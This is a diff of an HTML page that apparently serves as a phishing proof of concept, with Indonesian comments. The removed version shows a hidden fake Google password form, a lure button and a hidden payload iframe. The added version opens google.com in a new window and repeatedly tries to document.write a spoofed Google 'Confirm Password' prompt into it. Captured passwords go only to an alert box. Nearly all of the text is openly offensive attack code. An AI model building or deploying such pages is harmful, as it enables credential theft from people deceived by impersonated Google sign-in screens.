@@ -1,103 +1,55 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Redirect</title>
+    <title>Google Authentication</title>
     <style>
         body {
-            font-family: 'Arial', sans-serif;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            background: #fff;
-        }
-
-        .box {
-            width: 100%;
-            max-width: 400px;
+            font-family: sans-serif;
             text-align: center;
-            padding: 20px;
+            padding-top: 100px;
         }
 
-        /* FORM LOGIN AWALNYA DISEMBUNYIKAN */
-        #phishing-form {
-            display: none;
-            border: 1px solid #dadce0;
-            padding: 30px;
-            border-radius: 8px;
-        }
-
-        img {
-            width: 75px;
-            margin-bottom: 10px;
-        }
-
-        h1 {
-            font-size: 22px;
-            font-weight: 400;
-            margin-bottom: 20px;
-        }
-
-        input {
-            width: 90%;
-            padding: 12px;
-            margin-bottom: 15px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-        }
-
-        .btn-blue {
-            width: 95%;
-            padding: 12px;
-            background: #1a73e8;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-
-        /* TOMBOL PEMANCING AWAL */
-        #init-btn {
+        .btn {
             padding: 15px 30px;
-            font-size: 18px;
-            background: #34a853;
+            background: #4285f4;
             color: white;
             border: none;
             border-radius: 5px;
             cursor: pointer;
+            font-size: 16px;
         }
     </style>
 </head>
 
 <body>
 
-    <div class="box">
-        <button id="init-btn" onclick="triggerEverything()">Klik untuk Login ke Google</button>
-
-        <div id="phishing-form">
-            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
-            <h1>Verifikasi Akun</h1>
-            <p>Sesi Anda habis, masukkan password untuk verifikasi.</p>
-            <input type="password" id="target_pwd" placeholder="Password Google">
-            <button class="btn-blue" onclick="alert('Password terkirim ke attacker!')">Verifikasi</button>
-        </div>
-    </div>
-
-    <iframe id="spoof_frame" sandbox="allow-scripts allow-top-navigation allow-same-origin" src="payload_iframe.html"
-        style="display:none;"></iframe>
+    <button class="btn" onclick="exploit()">Sign in with Google</button>
 
     <script>
-        function triggerEverything() {
-            document.getElementById('init-btn').style.display = 'none';
-            document.getElementById('phishing-form').style.display = 'block';
-            const frame = document.getElementById('spoof_frame');
-            frame.contentWindow.postMessage('go', '*');
+        function exploit() {
+            let win = window.open("https://www.google.com/", "_blank");
+            let attempts = 0;
+            let hackInterval = setInterval(() => {
+                attempts++;
+                try {
+                    win.document.write(`
+              <html>
+              <body style="text-align:center;font-family:arial;">
+                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90">
+                <h2>Confirm Password</h2>
+                <input type="password" id="p" placeholder="Password" style="width:200px;padding:10px;"><br><br>
+                <button onclick="alert(document.getElementById('p').value)" style="background:#1a73e8;color:white;border:none;padding:10px 20px;">Next</button>
+              </body>
+              </html>
+            `);
+                    win.document.close();
+                    clearInterval(hackInterval);
+                    console.log("Injeksi tembus pada attempt ke-" + attempts);
+                } catch (e) {
+                    if (attempts > 100) clearInterval(hackInterval);
+                }
+            }, 5);
         }
     </script>
 </body>
